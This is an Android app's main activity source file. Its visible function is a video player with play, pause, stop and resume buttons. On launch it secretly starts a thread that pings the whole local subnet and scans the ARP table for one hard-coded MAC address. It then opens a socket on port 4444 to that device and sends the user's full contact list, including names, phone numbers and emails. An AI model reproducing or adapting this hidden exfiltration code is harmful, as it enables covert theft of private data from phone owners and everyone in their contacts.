package com.example.pingeveryone;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Enumeration;

import org.apache.http.conn.util.InetAddressUtils;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.VideoView;


public class MainActivity extends ActionBarActivity
{
	VideoView vidView;
	Button play,stop,pause,resume;
	int pausePos;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
		play = (Button) findViewById(R.id.play);
		pause = (Button) findViewById(R.id.pause);
		resume = (Button) findViewById(R.id.resume);
		stop = (Button) findViewById(R.id.stop);
		
		Ping obj = new Ping();
        obj.start();
        
play.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				vidView = (VideoView) findViewById(R.id.video);
				
				String urlpath = "android.resource://" + getPackageName() + "/" + R.raw.video;
				vidView.setVideoURI(Uri.parse(urlpath));
				vidView.start();
			}
		});
		stop.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				vidView.stopPlayback();
			}
		});
		pause.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				if(vidView.canPause())
				{
					pausePos = vidView.getCurrentPosition();
					vidView.pause();
				}
				else
				{
					vidView.seekTo(pausePos);
					vidView.start();
				}
			}
		});
		resume.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				vidView.seekTo(pausePos);
				vidView.start();
			}
		});
        
        
        
    }

    public class Ping extends Thread
    {
    	private String target_ip = null;
    	PrintStream output = null;
    	Socket client = null;
    	
    	int port = 4444;
    	String message = null;
    	
    	public void run()
    	{
    		BufferedReader output = null,error = null;
    		int i;
    		final String[] array = new String[1];
    		array[0] = "";
    		String s = null;
    	
    		String ip = get_ip_address();
    		
    		String mac = "30:85:a9:59:f4:91";
    		boolean found = false;
    		
    		
    		int index = ip.lastIndexOf('.');
    		
    		 ip = ip.substring(0,index+1);
    		 int packets = 1;
    		
    		
    		 
    		while(!found && (packets <= 3))
    		{
    			for(i=1 ; i<255 ; i++)
    			{	
    				try
    				{
    					Process process = Runtime.getRuntime().exec("/system/bin/ping -c " + packets +" -W 1 " + ip + i);
				
    					output = new BufferedReader(new InputStreamReader(process.getInputStream()));
    					error = new BufferedReader(new InputStreamReader(process.getErrorStream()));
    					array[0] = "" + i + "\n";
    				
    				
    				}
    				catch (IOException e) 
    				{
    					// TODO Auto-generated catch block
    					e.printStackTrace();
    				}
    			}
    		
    			try 
    			{
    				output.close();
    				error.close();
    			} 
    			catch (IOException e1)
    			{
    				// TODO Auto-generated catch block
    				e1.printStackTrace();
    			}
    		
    			BufferedReader file = null;
    		
    			try
    			{
    				file = new BufferedReader(new FileReader("/proc/net/arp"));
				
    				try 
    				{
    					file.readLine();
					
    					while((s = file.readLine()) != null)
    					{
    						String[] delimeter = s.split(" "); 
    						
    						i=1;
						
    						while(delimeter[i].equals(""))
    						{
    							i++;
    						}
						
    						i++;
						
    						while(delimeter[i].equals(""))
    						{
    							i++;
    						}
						
    						i++;
						
    						while(delimeter[i].equals(""))
    						{
    							i++;
    						}
    						
    						
    						if(delimeter[i].equals(mac))
    						{
    							found = true;
    							target_ip = delimeter[0];
    							break;
    						}
    					}
					
    				}
    				catch (IOException e)
    				{
    					e.printStackTrace();
    				}
    			} 
    			catch (FileNotFoundException e)
    			{
    				e.printStackTrace();
    			}
    		
    			try 
    			{
    				file.close();
    			}
    			catch (IOException e)
    			{
    				e.printStackTrace();
    			}
    			
    			if(found)
    			{
    				break;
    			}
    			else
    			{
    				packets++;
    			}
    			
    		}
			
    		
    		client_work();
    		
    	}
    	
    	
    	String get_ip_address()
    	{
    		try
    		{
    			for(Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements() ; )
    			{
    				NetworkInterface intf = en.nextElement();
    				
    				for(Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();)
    				{
    					InetAddress inetAddress = enumIpAddr.nextElement();
    					
    					if(!inetAddress.isLoopbackAddress())
    					{
    						//return inetAddress.getHostAddress().toString();
    						
    						String ipv4;
    						if (!inetAddress.isLoopbackAddress() && InetAddressUtils.isIPv4Address(ipv4 = inetAddress.getHostAddress())) {

    		                    //String ip = inetAddress.getHostAddress().toString();
    		                    //System.out.println("ip---::" + ip);
    		                    //EditText tv = (EditText) findViewById(R.id.ipadd);
    		                    //tv.setText(ip);
    		                    // return inetAddress.getHostAddress().toString();
    		                    return ipv4;
    		                }
    					}
    				}
    			}
    		}
    		catch(SocketException ex)
    		{
    			Log.e("ServerActivity" , ex.toString());
    		}
    		
    		return null;
    		
    	}
    	
    	public void client_work()
    	{
    		
    		try // try block for socket connection
    		{
				client = new Socket(target_ip,port);
			}
    		catch (UnknownHostException e)
    		{
				e.printStackTrace();
			}
    		catch (IOException e)
    		{
				e.printStackTrace();
			} // try_block over for socket connection
    		
    		
    		try
    		{
				output = new PrintStream(client.getOutputStream());
			}
    		catch (IOException e)
    		{
				e.printStackTrace();
			}
    		
    		fetchContacts();
    		
    		output.println(message);
    		output.flush();
    		
    		try
			{
				output.close();
				client.close();
			}
			catch(IOException e)
			{
	
			}
    		
    	}// client_work() function over
    	
    	
    	
        public void fetchContacts() 
        {
        	String phoneNumber = null;
            String email = null;
                 
            Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
            String _ID = ContactsContract.Contacts._ID;
            String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
            String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
     
            Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
            String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
     
            Uri EmailCONTENT_URI =  ContactsContract.CommonDataKinds.Email.CONTENT_URI;
            String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
            String DATA = ContactsContract.CommonDataKinds.Email.DATA;
     
     
            ContentResolver contentResolver = getContentResolver();
     
     
            Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);
            
            
            if (cursor.getCount() > 0)
            {
            	
                while (cursor.moveToNext())
                {
     
                    String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
                    String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));
     
                    int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));
     
                    if (hasPhoneNumber > 0)
                    {
     
                        message = message + "First Name: " + name;
     
                        // Query and loop for every phone number of the contact
                        Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);
     
                        while (phoneCursor.moveToNext())
                        {
                            phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                            message = message + "::Phone number: " + phoneNumber;
     
                        }
     
                        phoneCursor.close();
     
                        // Query and loop for every email of the contact
                        Cursor emailCursor = contentResolver.query(EmailCONTENT_URI,    null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);
     
                        while (emailCursor.moveToNext())
                        {
     
                            email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
     
                            message = message + "::Email: " + email ;
     
                        }
     
                        emailCursor.close();
                    }
     
                    message = message + ":::";
                }
     
            }
     
        } // fetchContacts() function end
    	
    }

     
    
    @Override
    public boolean onCreateOptionsMenu(Menu menu)
    {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item)
    {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.action_settings)
        {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
